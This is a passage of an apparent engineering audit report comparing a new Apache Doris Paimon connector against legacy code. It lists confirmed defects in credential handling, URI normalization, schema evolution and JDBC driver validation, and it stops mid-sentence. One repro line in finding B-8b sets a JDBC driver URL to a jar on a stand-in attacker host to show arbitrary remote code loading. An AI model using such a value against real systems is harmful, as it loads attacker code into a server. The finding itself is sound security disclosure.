# P5 Paimon Connector — Clean-Room 2nd-Round Parity Re-Review (2026-06-11)

## 1. Scope

This is a **clean-room, 2nd-round parity audit** of the Apache Doris paimon connector
migration, performed at **HEAD `98a73bf7692`** ("[P5-B7+fixes] paimon B7 cutover + 8
fullpath-review fixes"). The **baseline is the legacy `datasource/paimon/*` source set,
which is still in the tree** (dead-but-in-tree after the B7 cutover) and is used verbatim
as the parity target. The cutover is **live**: `paimon` is a member of
`CatalogFactory.SPI_READY_TYPES` (`fe/fe-core/.../datasource/CatalogFactory.java:51`), so a
paimon catalog is constructed as `PluginDrivenExternalCatalog` and routes scans through
`PluginDrivenScanNode` + the connector `PaimonScanPlanProvider`, not the legacy
`PaimonScanNode`. The legacy classes are never reached on the connector path.

The audit ran **13 path reviews** plus a **completeness critic**. Every BLOCKER/MAJOR
finding was put through a **3-lens adversarial verification** (new-code-correctness,
legacy-parity, reproducibility). A finding is **CONFIRMED** when upheld by **>= 2 of the 3
lenses**. MINOR/NIT findings were recorded but not subjected to the full 3-lens gate.

This report is faithful to the structured audit data: severities are not invented, and
refuted findings are not upgraded.

---

## 2. Verdict Summary

| Bucket | Count |
| --- | --- |
| **CONFIRMED BLOCKER** | **4** (distinct defects; 6 BLOCKER finding-instances across paths, deduped below) |
| **CONFIRMED MAJOR** | **6** (distinct defects; 7 MAJOR finding-instances across paths, deduped below) |
| **Findings RAISED but REFUTED** by adversarial verification | **1** (the standalone "field-id loss" MAJOR repro lens, path #10) |
| **MINOR / NIT** | **~18** (compact list in §5) |

### Deduplicated CONFIRMED BLOCKER families (4 distinct root causes)

1. **Native-reader URI scheme normalization lost** — data-file path **and** deletion-vector
   path sent to BE un-normalized (oss://, cos://, obs://, s3a:// not rewritten to s3://).
   Surfaced as BLOCKERs in paths #7 (DV path), #7 (data-file path), #9 (static credentials
   sibling on same native path), and the critic (additional_finding). One root cause, broad
   blast radius on S3-compatible warehouses.
2. **Native-reader schema-evolution lost** — connector never emits
   `current_schema_id` / `history_schema_info`, so BE degrades to NAME-based file<->table
   column matching → silent wrong/NULL rows on column rename/reorder. Surfaced as BLOCKERs in
   paths #1, #10 (params-level), #13, and the critic.
3. **Static S3/OSS/COS/OBS credentials reach BE as RAW keys** (`s3.access_key`, not
   `AWS_ACCESS_KEY`) → native reader on a private object-store bucket gets no usable
   credentials. Path #9.
4. **JDBC flavor** — two BLOCKERs: (a) sends BE the **raw, unresolved `jdbc.driver_url`**
   and drops the `paimon.jdbc.*` alias → `MalformedURLException`; (b) **JDBC `driver_url`
   security allow-list / format validation / secure-path not enforced** → arbitrary remote
   jar loaded into the FE JVM. Path #8.

### Deduplicated CONFIRMED MAJOR families (6 distinct root causes)

1. **`force_jni_scanner` session variable silently ignored** — the JNI escape hatch is gone;
   native always chosen for ORC/Parquet regardless of the flag. Paths #1 and #13.
2. **COUNT(\*) pushdown (FE-computed `mergedRowCount`) not implemented** — BE materializes
   merged rows to count; correctness preserved by frozen BE `-1` fallback. Path #1.
3. **Native ORC/Parquet sub-file splitting (parallelism) lost** — one split per RawFile.
   Path #1.
4. **filesystem/jdbc over Kerberized HDFS lose UGI `doAs`** — HDFS authenticator never wired
   (`initializeCatalog` is dead on the cutover path). Path #8.
5. **MTMV / SHOW PARTITIONS / partitions-TVF partition listing loses the Kerberos
   authenticator** (UGI `doAs`) that legacy applied. Path #11.
6. **Read-schema type-mapping flags silently disabled** — connector reads underscore keys
   (`enable_mapping_binary_as_varbinary` / `enable_mapping_timestamp_tz`) while FE/legacy
   set DOTTED keys (`enable.mapping.varbinary` / `enable.mapping.timestamp_tz`) → BINARY and
   TIMESTAMP_TZ columns map to the WRONG Doris type for any user who enabled the flags.
   Surfaced by the completeness critic (additional_finding); not caught by the 13 paths.
   *(This is a critic-surfaced MAJOR; it was not run through the 3-lens gate but is
   evidence-anchored end-to-end.)*

Also confirmed MAJOR (read direction, path #10): **read schema loses the paimon field-id
(`Column.uniqueId`) for every column including nested complex types** — confirmed by 2 of 3
lenses (the reproducibility lens of the *standalone* `Column.getUniqueId()` repro was
refuted; see §4). The underlying BE-contract consequence is the same machinery as BLOCKER #2.

### Commit-ready? **NO**

The branch is **not commit-ready**. There are 4 distinct CONFIRMED BLOCKER families, each
reachable on a normal query against a realistically configured paimon catalog post-cutover.

**Gating items (must be resolved before commit):**

- **B1 — Native URI scheme normalization** (data-file + deletion-file paths). Restore the
  legacy `validateAndNormalizeUri` (oss/cos/obs/s3a → s3) on the connector native path or via
  an SPI path-normalization seam. Breaks all native ORC/Parquet + DV reads on
  OSS/COS/OBS/s3a warehouses.
- **B2 — Native schema-evolution** (`current_schema_id` / `history_schema_info`). Restore
  field-id-based file<->table column mapping; otherwise schema-evolved (renamed) tables read
  wrong/NULL rows silently on the default native path.
- **B3 — Static object-store credentials** delivered as RAW keys. Normalize to canonical
  `AWS_*` keys (or vend through the same normalization tail as REST). Breaks native reads on
  any private S3/OSS/COS/OBS bucket created with the documented `s3.*`/`oss.*` properties.
- **B4 — JDBC flavor**: resolve `jdbc.driver_url` via `getFullDriverUrl` on the BE-options
  path, honor the `paimon.jdbc.*` alias, AND enforce the FE security allow-list / format /
  secure-path validation. Otherwise a JDBC catalog fails (`MalformedURLException`) and/or
  loads an arbitrary remote jar into the FE JVM.

The 6 MAJOR families should be addressed or explicitly accepted (with the Kerberos-`doAs`
losses on filesystem/jdbc and MTMV partition listing being the most behavior-affecting on
secured deployments, and the dotted-vs-underscore mapping-flag bug being a real wrong-type
regression).

---

## 3. CONFIRMED BLOCKER + MAJOR Findings Table

Verdict legend: `C` = new-code-correctness, `P` = legacy-parity, `R` = reproducibility;
`upheld` / `refuted`. "Confirmed" = upheld by >= 2 lenses.

### CONFIRMED BLOCKERs

| ID | Sev | Title | Connector file:line | Legacy file:line | Behavior diff | Repro | 3-lens verdict (upheld/3) |
| --- | --- | --- | --- | --- | --- | --- | --- |
| B-1a | BLOCKER | Native read loses paimon schema-evolution (`history_schema_info` / `current_schema_id`) → silently wrong rows on schema-evolved tables | `PaimonScanPlanProvider.java:276` (only `.schemaId(file.schemaId())`); `PaimonScanRange.java:181-184`; `PluginDrivenScanNode.java:519-572,782-799` (never calls `ExternalUtil.initSchemaInfo`) | `paimon/source/PaimonScanNode.java:169,285,236-251`; `ExternalUtil.java:86-92` | Legacy sets `current_schema_id=-1` + pushes current(-1) and per-file historical `TSchema` into `history_schema_info`; BE (`table_schema_change_helper.h:241-268`) matches BY FIELD ID. Connector emits only per-file `schema_id`, never the params, so BE takes the `!isset` branch (`:219-235`) → NAME-based matching → renamed columns in older-schema files read NULL/garbage. JNI path unaffected; native is the default. | `test_paimon_full_schema_change.groovy` (struct field a→new_a) over ORC/Parquet; `SELECT new_a` returns NULL for pre-rename rows | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| B-7DV | BLOCKER | Native deletion-vector path sent to BE un-normalized (oss/cos/s3a not rewritten to s3) → MOR read fails / corruption on S3-compatible Paimon tables | `PaimonScanPlanProvider.java:281-283` (`builder.deletionFile(df.path(),...)` raw); `PaimonScanRange.java:190-200` (`deletionFile.setPath` verbatim) | `paimon/source/PaimonScanNode.java:295-298` (`LocationPath.of(deletionFile.path(), storagePropertiesMap).toStorageLocation()`) | Legacy normalizes DV uri via `validateAndNormalizeUri` (oss→s3); connector passes raw paimon path. BE `paimon_reader.cpp:96` opens `delete_range.path` verbatim via scheme-dispatched factory → only `s3://` recognized → DV open fails or deleted rows reappear. No `ConnectorContext` path-normalization seam exists. | OSS/COS/OBS warehouse, `deletion-vectors.enabled=true`; DELETE then SELECT → native split carries `oss://...index/...`; BE can't open DV → deleted rows reappear | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| B-7DF | BLOCKER | Native **data-file** path also sent to BE un-normalized (same root cause) → native ORC/Parquet read fails on S3-compatible tables, which gates the DV merge | `PaimonScanPlanProvider.java:269-276` (`.path(file.path())`); `PluginDrivenSplit.java:65-68` (single-arg, NON-normalizing `LocationPath.of`); consumed `FileQueryScanNode.java:568` | `paimon/source/PaimonScanNode.java:443` (2-arg normalizing `LocationPath.of`) | Legacy builds the native RawFile path via the 2-arg normalizing factory so the split path is already `s3://`. Connector path: `file.path()` (raw oss://) → single-arg `LocationPath.of` sets `normalizedLocation=location` verbatim → `:568` emits raw oss://. Same scheme-mismatch failure at BE's S3 file factory. Sibling of B-7DV; on its own breaks native reads of OSS/COS-backed tables, DV-bearing or not. | Same OSS/COS table, parquet/orc data → native split asked to open `oss://bkt/...parquet` → BE `S3URI::parse` returns `InvalidArgument` | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| B-9 | BLOCKER | Static S3/OSS/COS/OBS credentials reach BE as RAW keys (`s3.access_key`, not `AWS_ACCESS_KEY`) — native reader on a private bucket gets no usable credentials | `PaimonScanPlanProvider.java:347-356` (copies raw keys verbatim under `location.<rawkey>`) | `paimon/source/PaimonScanNode.java:176,650-652`; `AbstractS3CompatibleProperties.java:105-122`; BE `s3_util.cpp:146-150` | Legacy normalizes any raw alias (`s3.access_key`/`oss.access_key`/…) into canonical `AWS_ACCESS_KEY`/`AWS_SECRET_KEY`/`AWS_ENDPOINT`/`AWS_REGION`/`AWS_TOKEN`. Connector copies raw catalog keys verbatim under `location.*`; `PluginDrivenScanNode.getLocationProperties:307-317` only strips the prefix. BE native ORC/Parquet (FILE_S3) parses only `AWS_*` → no credentials → 403. JNI path unaffected (serialized Table carries its own FileIO). Bare `AWS_*`/`access_key` (no `s3.` prefix) is dropped entirely. Codified by connector's own `PaimonScanPlanProviderTest.java:535`. | `CREATE CATALOG ... s3.access_key/s3.secret_key/s3.endpoint`; `SELECT *` over raw parquet/orc → BE gets `location.s3.access_key` (unrecognized) → AccessDenied | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| B-8a | BLOCKER | JDBC flavor sends BE raw unresolved `jdbc.driver_url` and drops the `paimon.jdbc` alias | `PaimonScanPlanProvider.java:549-565` (forwards all `jdbc.*` keys verbatim) | `PaimonJdbcMetaStoreProperties.java:164-176`; `PaimonScanNode.java:507-520` | Legacy emits only `jdbc.driver_url=getFullDriverUrl(resolved)` + `jdbc.driver_class`. Connector forwards `jdbc.*` verbatim so `driver_url` is unresolved; the `paimon.jdbc.driver_url` alias (`PaimonConnectorProperties.java:73`) fails the `key.startsWith("jdbc.")` filter and is dropped. BE `JdbcDriverUtils.java:42 new URL(value)`; bare jar → `MalformedURLException`. | `CREATE CATALOG paimon jdbc, jdbc.driver_url=mysql.jar`; `SELECT` → `MalformedURLException` | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| B-8b | BLOCKER | JDBC `driver_url` security allow-list and format validation not enforced | `PaimonConnector.java:232-247,206-216,249-287` (`resolveFullDriverUrl` does no validation) | `JdbcResource.java:300-329`; `PaimonJdbcMetaStoreProperties.java:190` | Legacy `getFullDriverUrl` rejects bad formats, runs `checkCloudWhiteList` vs `jdbc_driver_url_white_list`, enforces `jdbc_driver_secure_path`. Connector accepts any scheme/path, loads the jar in the FE JVM at create. The in-code "paimon is not in SPI_READY_TYPES" disclaimer (`PaimonConnector.java:230`) is **stale/false** post-B7 (`CatalogFactory.java:51` now includes paimon). The correct hook `ConnectorValidationContext.validateAndResolveDriverPath` is wired (jdbc/trino override `preCreateValidation`) but paimon does not override it. | FE with non-default `jdbc_driver_secure_path`; `CREATE CATALOG paimon jdbc, jdbc.driver_url=http://attacker/evil.jar` → connector loads it into FE JVM | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |

> **Note on schema-evolution BLOCKER duplication:** paths #1, #10 (params-level), #13, and the
> critic each independently confirmed the *same* native schema-evolution loss against the same
> connector lines (`PaimonScanRange.java:181-184`) and the same BE branch
> (`table_schema_change_helper.h`). They are one defect (B-1a / B2 family), each 3/3 confirmed.
> Likewise the URI-normalization BLOCKERs (B-7DV, B-7DF) are two instances of the one
> normalization root cause and were re-confirmed by the critic's `additional_finding`.

### CONFIRMED MAJORs

| ID | Sev | Title | Connector file:line | Legacy file:line | Behavior diff | Repro | 3-lens verdict (upheld/3) |
| --- | --- | --- | --- | --- | --- | --- | --- |
| M-1 | MAJOR | `force_jni_scanner` session variable silently ignored on the connector scan path | `PaimonScanPlanProvider.java:261,439-441` (only `paimonHandle.isForceJni()`, the binlog/audit flag) | `paimon/source/PaimonScanNode.java:361,430` (`sessionVariable.isForceJniScanner()` gate) | Legacy routes ALL data splits to JNI when `SET force_jni_scanner=true`. Connector has no equivalent; native always chosen for ORC/Parquet. The var IS in the session-properties map (connector reads sibling `enable_paimon_cpp_reader` from it) but is never consulted. The escape hatch (used to dodge native-reader bugs, e.g. the schema-evolution BLOCKER) is gone. | `SET force_jni_scanner=true; SELECT * FROM paimon_orc_table` → connector still native | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| M-2 | MAJOR | COUNT(\*) pushdown (FE-computed `mergedRowCount`) not implemented | `PaimonScanPlanProvider.java:186-296` (no count branch; `paimon.row_count` never set) | `paimon/source/PaimonScanNode.java:396,421-429,483-495,303-308` | Count pushdown is still ENABLED for the node (`PhysicalPlanTranslator.java:873`), but connector never computes `mergedRowCount` nor emits `paimon.row_count`, so `table_level_row_count=-1`. BE falls back (`paimon_jni_reader.cpp:104`, `file_scanner.cpp:1298-1326`) and materializes merged rows to count. Results CORRECT; perf regression, esp. for PK tables (merges/deletes). | `SELECT count(*) FROM paimon_pk_table` → connector materializes all merged rows via JNI | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| M-3 | MAJOR | Native ORC/Parquet sub-file splitting (parallelism) lost | `PaimonScanPlanProvider.java:263-286` (one range per RawFile; no split-size logic) | `paimon/source/PaimonScanNode.java:434-465,499-500` (`determineTargetFileSplitSize` + `fileSplitter.splitFile`) | Legacy splits each native raw file into many sub-range splits for intra-file parallelism. Connector emits exactly one split per file; `PluginDrivenSplit` is a pure 1:1 wrapper, no re-split, no `setTargetSplitSize`. Large ORC/Parquet files → one scanner instead of many. Correctness unchanged. | `SELECT *` over multi-GB native files → fewer parallel scan instances | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| M-8 | MAJOR | filesystem/jdbc over Kerberized HDFS lose UGI `doAs` (HDFS authenticator never wired) | `PaimonConnector.java:124-196`; `PluginDrivenExternalCatalog.java:122-137,150` | `PaimonFileSystemMetaStoreProperties.java:40-57`; `PaimonJdbcMetaStoreProperties.java:111-135` | Legacy sets the HDFS Kerberos authenticator in `initializeCatalog` and wraps ops in `doAs`. Connector never calls `initializeCatalog` (only the bypassed legacy `createCatalog` does); runtime authenticator stays the base no-op (`AbstractPaimonProperties.java:45`). HMS works because it sets the authenticator in `initNormalizeAndCheckProps` (always runs). filesystem/jdbc have no such override → no `doAs`. | `CREATE CATALOG paimon filesystem` on Kerberized HDFS → reads run outside `doAs`, fail KDC auth | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| M-10 | MAJOR | Read schema loses paimon field-id (`Column.uniqueId`) for every column incl. nested complex types | `PaimonConnectorMetadata.java:1007-1012` (5-arg `ConnectorColumn`, no field-id); `ConnectorColumnConverter.java:65-70` (7-arg `Column` ctor → `uniqueId=-1`) | `PaimonExternalTable.java:349-355` (`updatePaimonColumnUniqueId`); `PaimonUtil.java:318-347` (recurses into ARRAY/MAP/ROW) | Legacy sets `column.setUniqueId(paimonField.id())` on every column and recursively on nested children. SPI `ConnectorColumn` has no field-id channel; `convertColumn` never sets `uniqueId`, so all Doris columns carry `uniqueId=-1`. Root cause that also disables the field-id BE contract (BLOCKER B2 family). | `DESCRIBE` paimon table: legacy field ids vs connector all `-1` | C=upheld, P=upheld, **R=refuted** (2/3, **confirmed** by majority; see §4) |
| M-11 | MAJOR | MTMV / SHOW PARTITIONS / partitions-TVF partition listing loses the Kerberos authenticator (UGI `doAs`) | `PaimonCatalogOps.java:249-251` (bare `catalog.listPartitions`); `PaimonConnectorMetadata.java:892-894` (unwrapped); `PluginDrivenMvccExternalTable.java:157`; `PluginDrivenExternalTable.java:317-318` | `PaimonExternalCatalog.java:96-118` (`getPaimonPartitions` wraps in `executionAuthenticator.execute`); `PaimonPartitionInfoLoader.java:49` | Legacy ran remote `listPartitions` inside a per-CALL Kerberos UGI `doAs`. Connector issues the same RPC with NO `executeAuthenticated` wrap (deliberate D7=B read-vs-DDL asymmetry; DDL ops ARE wrapped). On a Kerberos HMS catalog the RPC runs without the catalog principal → GSS failure or wrong-principal read. (Claim's "DLF" clause overstated — DLF inherits the no-op authenticator; concrete loss is HMS-Kerberos.) Gated to secured deployments. | Kerberos HMS catalog: `CREATE MV ... FROM partitioned_tbl`, `SHOW PARTITIONS`, or `partitions(...)` TVF → listPartitions RPC runs without `doAs` | C=upheld, P=upheld, R=upheld (**3/3, confirmed**) |
| M-crit | MAJOR | Read-schema type-mapping flags silently disabled: connector reads underscore keys but FE/legacy set DOTTED keys → BINARY / TIMESTAMP_TZ map to the WRONG Doris type for users who enabled them | `PaimonConnectorProperties.java:39,42` (`enable_mapping_binary_as_varbinary` / `enable_mapping_timestamp_tz`); read `PaimonConnectorMetadata.java:1017-1027`; consumed `PaimonTypeMapping.java:130-165` | `CatalogProperty.java:50,52` (`enable.mapping.varbinary` / `enable.mapping.timestamp_tz`); `ExternalCatalog.setDefaultPropsIfMissing:302-306`; `PaimonUtil.paimonPrimitiveTypeToDorisType:253,257,283-286` | `createConnectorFromProperties` passes raw catalog props (DOTTED keys) to the connector, which looks up the UNDERSCORE keys → absent → both flags default false unconditionally. Legacy mapped BINARY→VARBINARY and TIMESTAMP_WITH_LOCAL_TIME_ZONE→TIMESTAMPTZ when enabled; connector always maps BINARY→STRING and LTZ→DATETIMEV2. The varbinary key is also semantically renamed, so even hand-correcting dots→underscores would still miss it. | `CREATE CATALOG ... 'enable.mapping.timestamp_tz'='true'`; `DESC`/`SHOW CREATE TABLE` → legacy TIMESTAMPTZ, connector DATETIMEV2 | Critic-surfaced; evidence-anchored end-to-end (not run through 3-lens gate) |

---

## 4. Findings RAISED but REFUTED by adversarial verification

Only one verdict-bearing finding was refuted on a lens (the finding overall is still
confirmed at MAJOR by the other two lenses — only the *standalone repro* was refuted):

- **M-10 reproducibility lens — REFUTED (the standalone `Column.getUniqueId()` repro).**
  The factual core is real (cutover paimon columns carry `uniqueId=-1`; legacy set it via
  `updatePaimonColumnUniqueId`). But the *asserted observable* —
  `ExternalUtil.getExternalSchema(root.setId(column.getUniqueId()))` — is **not reachable at
  HEAD** for a cutover paimon table for three independent reasons:
  1. **Dead path for cutover.** The only paimon caller of `ExternalUtil.initSchemaInfo` is the
     legacy `PaimonScanNode:169`. A cutover paimon table routes via
     `PhysicalPlanTranslator.java:737` to `PluginDrivenScanNode`, which returns `FORMAT_JNI`,
     never calls `initSchemaInfo`, and never references `getUniqueId` (grep: zero hits).
  2. **`getUniqueId()` was never the BE field-id channel even in legacy.** Line 169 passes
     `schemaId=-1` with a TODO; the per-schema field-id the BE native reader actually consumes
     flows through `PaimonScanNode.putHistorySchemaInfo` → `PaimonUtil.getSchemaInfo` →
     `childField.setId(paimonField.id())` (`PaimonUtil.java:415`), read straight from the
     paimon `DataField`, **not** from `Column.getUniqueId()`. So the claim mislocates the
     channel.
  3. **No live FE consumer surfaces it.** DESCRIBE/SHOW COLUMNS render
     name/type/comment/nullable, not `uniqueId`; the only external-table consumer of
     `getUniqueId()` is the dead `ExternalUtil` path.

  The genuine BE field-id concern belongs to the separately-confirmed BLOCKER (B2 family,
  connector scan-side `history_schema_info`), a different code path. As a STANDALONE MAJOR with
  the asserted `Column.getUniqueId()`/`ExternalUtil` repro, this claim's repro does not trigger
  at HEAD — refuted on the reproducibility lens. The new-code-correctness and legacy-parity
  lenses upheld it (the field-id IS lost FE-side), so M-10 remains **confirmed MAJOR** by
  majority, with the caveat that its observable impact rides entirely on the B2 BLOCKER, not on
  a distinct user-visible `uniqueId` symptom.

No findings were upgraded; no BLOCKER/MAJOR severities were invented for refuted items.

---

## 5. MINOR / NIT Findings (compact)

Path #1 (basic read):
- **MINOR** `ignore_split_type` session variable ignored (`PaimonScanPlanProvider.java`; legacy `PaimonScanNode.java:368-369,389-391,431-433,471-473`). Diagnostic-only.
- **MINOR** Partition null-sentinel handling differs (`\N` / `__HIVE_DEFAULT_PARTITION__` coerced to NULL) (`PaimonScanRange.java:221-225` → `ConnectorPartitionValues.java:46-53`; legacy `PaimonScanNode.java:323-326`). Extreme edge case.
- **MINOR** CAST-bearing predicates no longer pushed to Paimon — **intentional, safer than legacy** (`PaimonConnectorMetadata.java:810-813`; legacy `PaimonPredicateConverter.java:178-200`). Reduced source-side pruning only; prevents a latent legacy over-pruning data-loss bug.

Path #2 (@incr):
- **NIT** Sys-table + @incr rejection message text changed "Paimon" → "Plugin" (`PluginDrivenScanNode.java:511`; legacy `PaimonScanNode.java:885`).
- **MINOR** BE-serialized table for @incr is the incremental-window-copied table vs legacy latest-snapshot-pinned — verified inert on the BE read path (`PaimonScanPlanProvider.java:306-316`; legacy `PaimonScanNode.java:167`).

Path #3 (time travel):
- **MINOR** TIMESTAMP not-found error message text differs (loses earliest-snapshot hint), same condition (`PluginDrivenMvccExternalTable.java:328-333`; legacy `PaimonUtil.java:665-676`).
- **NIT** INCREMENTAL @incr drops legacy's `scan.snapshot-id=null` / `scan.mode=null` defensive resets — no-op on a fresh base Table (`PaimonIncrementalScanParams.java:222-267`; legacy `PaimonScanNode.java:841-846`).

Path #4 (branch/tag):
- **MINOR** Branch schema resolved against the BRANCH's `schemaManager` vs the BASE table's (`PaimonConnectorMetadata.java:188-197`; legacy `PaimonExternalTable.java:342-343`). Connector arguably more correct.
- **MINOR** Branch `schemaId` from latest-snapshot.schemaId() vs `schemaManager.latest().id()` (`PaimonConnectorMetadata.java:485-489`; legacy `PaimonExternalTable.java:167-170`). Diverges only on ALTER-without-snapshot.
- **NIT** Branch/sys/timestamp not-found error-message text divergences, same conditions (`PluginDrivenMvccExternalTable.java:319-336`; legacy `PaimonUtil.java:701-707`).

Path #5 (sys-tables):
- **MINOR** `getSupportedSysTables()` now requires a remote table-handle resolution; legacy returned a static list. Transient remote failure suppresses the sys-table catalog (`PluginDrivenExternalTable.java:391-416`; legacy `PaimonExternalTable.java:392-396`).

Path #6 (metadata cache):
- **MINOR** Legacy live-Table handle cache dropped — every metadata/scan access re-fetches the Table; `paimon.table.cache.*` sizing props now inert (`PaimonConnectorMetadata.java:131`; legacy `PaimonExternalMetaCache.java:70-72,98-102`). Perf only.
- **MINOR** Schema cache keyed by name only (not `schemaId`) — historical time-travel schema recomputed per query (`PluginDrivenMvccExternalTable.java:254-257,347-357`; legacy `PaimonSchemaCacheKey.java:25-55`). Correctness preserved; perf only.

Path #7 (deletion vectors):
- **MINOR** `getDeleteFiles()` not overridden for plugin-driven scans → VERBOSE EXPLAIN omits deletion-file accounting (`PluginDrivenScanNode.java` inherits `FileScanNode.java:123` default; legacy `PaimonScanNode.java:337-357`). Display-only.

Path #9 (storage systems):
- **MINOR** HDFS static config drops legacy-derived defaults (`ipc.client.fallback-to-simple-auth-allowed=true`, `hdfs.security.authentication`, hadoop config-resources file) (`PaimonScanPlanProvider.java:348-356`; legacy `HdfsProperties.java:163-189`). Same root cause as B-9.
- **MINOR** FE-only metastore keys (`hive.metastore.uris` and all `hive.*`, incl. keytab paths) pushed to BE as `location.*` (`PaimonScanPlanProvider.java:350-354`; legacy `PaimonScanNode.java:650-652` never sent them). Information-exposure/noise; BE ignores unknown keys.

Path #10 (type mapping):
- **MINOR** WRITE direction drops nested struct-field comments (`PaimonTypeMapping.java:265-276`; root cause `ConnectorColumnConverter.java:100-108` — `ConnectorType.structOf` carries names only; legacy `DorisToPaimonTypeVisitor.java:51-63`).
- **MINOR** Read schema: every paimon column now `isKey=false` (legacy `initSchema` marked all `isKey=true`) (`PaimonConnectorMetadata.java:1007`; legacy `PaimonExternalTable.java:349-353`). DESCRIBE display only.
- **MINOR** Read schema loses `WITH_TIMEZONE` extraInfo tag for LTZ columns (`PaimonTypeMapping.java:157-166`, `PaimonConnectorMetadata.java:993-1014`; legacy `PaimonExternalTable.java:356-358`). DESCRIBE/SHOW display only.
- **NIT** Read VARCHAR length boundary off-by-one: VARCHAR(65533) → STRING (connector) vs VARCHAR(65533) (legacy); also `len<=0` → STRING (`PaimonTypeMapping.java:113-119`; legacy `PaimonUtil.java:239-244`). Reported type only; same data.

Path #12 (MVCC):
- **MINOR** Branch time-travel `schemaId` from latest-snapshot's schema, not branch's latest schema (`PaimonConnectorMetadata.java:486-489`; legacy `PaimonExternalTable.java:168`). Diverges only on commit-without-data.
- **MINOR** FOR TIME AS OF not-found message loses the "earliest snapshot timestamp" detail (`PluginDrivenMvccExternalTable.java:328-333`; legacy `PaimonUtil.java:666-676`). Text-only.

Path #13 (cross-cutting):
- **MINOR** Connector ignores `ignore_split_type` (`IGNORE_JNI`/`IGNORE_NATIVE`) (`PaimonScanPlanProvider.java:234-292`; legacy `PaimonScanNode.java:368-369,389,431,471`). Diagnostic-only.

Critic additional findings (MINOR):
- **MINOR** Partition NULL value rendered `\N` (connector) vs `""` (legacy) in `columnsFromPath`; connector additionally coerces literal `__HIVE_DEFAULT_PARTITION__`/`\N` string partition values to NULL (`PaimonScanRange.java:212-225`, `ConnectorPartitionValues.java:32-54`; legacy `PaimonScanNode.java:323-326`).
- **MINOR** ALTER TABLE CREATE/REPLACE/DROP BRANCH/TAG on a cutover paimon table throws a different exception type/message (base `ExternalCatalog.java:1432-1501` `DdlException` vs legacy `PaimonMetadataOps.java:315-333` `UnsupportedOperationException`). Both reject; text/class only.

---

## 6. Per-Path Parity Summaries (13 paths)

**Path #1 — Basic read (normal scan): NOT at parity.** Core per-type partition rendering,
predicate literal conversion, JNI/native/cpp split-format selection, table-location,
self-split-weight, serialized-table, predicate push, and session-timezone source are all
byte-faithful and match. But the connector does not run old logic and in doing so DROPS
several legacy fe-core semantics: most seriously the entire schema-evolution mechanism
(BLOCKER B-1a), plus `force_jni_scanner`/`ignore_split_type` controls, storage-path scheme
normalization, FE-side COUNT(\*) pushdown, and FE-side sub-file splitting. One BLOCKER + four
MAJORs.

**Path #2 — Batch incremental read (@incr): CLEAN.** `PaimonIncrementalScanParams.validate`
is a byte-faithful port of legacy `validateIncrementalReadParams` (only signature, cosmetic
wrapping, and three benign stripped null-resets differ). All three legacy guards reproduced;
the stripped null-resets are verified benign because the connector's base table is never
pre-pinned. No BLOCKER/MAJOR; two NIT/MINOR that do not change results.

**Path #3 — Time Travel (FOR TIME/VERSION AS OF): CLEAN.** Cutover is real end-to-end; legacy
`PaimonExternalTable.getPaimonSnapshotCacheValue` is unreachable. All five spec kinds map
byte-faithfully; session-TZ datetime parse replicates `TimeUtils` byte-for-byte;
schema-at-snapshot resolves the historical schema + partition keys exactly. Only divergences
are documented, text-only/effect-noop. No BLOCKER/MAJOR.

**Path #4 — Branch / Tag read: CLEAN (no data-loss/wrong-rows).** Cleanly cutover; TAG read is
byte-parity; BRANCH read is functionally correct and matches legacy at the data level. The
only real divergences are in branch SCHEMA-version resolution under independent branch schema
evolution (connector reads the branch's own `schemaManager`/snapshot schema — arguably MORE
correct than legacy) plus three text-only error-message divergences. No BLOCKER/MAJOR.

**Path #5 — System tables: CLEAN.** Legacy sys path is DEAD for cutover catalogs and does not
fall back. The connector reimplementation is a near-exact parity port:
`listSupportedSysTables`, `getSysTableHandle` (same 4-arg identifier, same case-insensitive
check, same `forceJni={binlog,audit_log}` rule), the HIVE_TABLE descriptor, privilege unwrap,
and SHOW CREATE TABLE unwrap all match. Only divergence: `getSupportedSysTables()` now needs a
live remote handle resolution (MINOR).

**Path #6 — Metadata cache: CLEAN (perf/architectural only).** The cutover intentionally swaps
the legacy 3-level paimon cache for the generic schema-only cache + per-query live metadata,
and does so correctly. No live control flow back into `datasource/paimon/*`; GSON compat
revives old catalogs/dbs/tables as PluginDriven variants. REFRESH TABLE/CATALOG/DB and ALTER
CATALOG SET PROPERTIES all reach correct invalidation; partition-name rendering and
`isPartitionInvalid` are byte-parity. Divergences are perf/architectural, not correctness —
no wrong-rows, no lost invalidation, no stale-cache hazard.

**Path #7 — Deletion Vector read: NOT at parity (BLOCKER).** DV assembly STRUCTURE
(native-vs-JNI routing, per-i DV pairing, `selfSplitWeight` accounting, BE thrift wire format)
is faithful. But the connector drops the legacy URI normalization on BOTH the deletion-file
path AND the native data-file path — feeding BE unrecognized `oss://`/`cos://`/`obs://`/`s3a://`
schemes. Two BLOCKERs (B-7DV deletion-file, B-7DF data-file). Pure-`s3://`/`hdfs://` tables are
unaffected. One MINOR (EXPLAIN delete-file accounting).

**Path #8 — Multi metadata-service (flavor assembly): NOT at parity.** Paimon is LIVE. Most
flavor logic matches and HMS Kerberos auth survives. But two BLOCKERs (JDBC raw/unresolved
`driver_url` + dropped alias → `MalformedURLException`; JDBC driver_url security validation
bypassed → arbitrary remote jar in FE JVM) and one MAJOR (filesystem/jdbc over Kerberized HDFS
lose UGI `doAs` because `initializeCatalog` is dead on the cutover path). The in-code
"not in SPI_READY_TYPES" disclaimer is stale.

**Path #9 — Multi storage-system access: NOT at parity (BLOCKER).** Two sub-paths. (1) Vended
REST credentials: faithful — reuses the EXACT legacy normalization tail, byte-equivalent AWS_*
keys. CLEAN. (2) STATIC (non-vended) S3/OSS/COS/OBS credential downflow is BROKEN: connector
copies RAW catalog keys verbatim under `location.*` with no normalization, so BE's native
reader never sees recognized `AWS_*` credentials (BLOCKER B-9). Verified against the
connector's own test that codifies the raw key. Two MINORs (HDFS derived defaults dropped;
FE-only `hive.*` keys leaked to BE).

**Path #10 — Column type mapping: NOT at parity.** WRITE direction (Doris→Paimon) is a
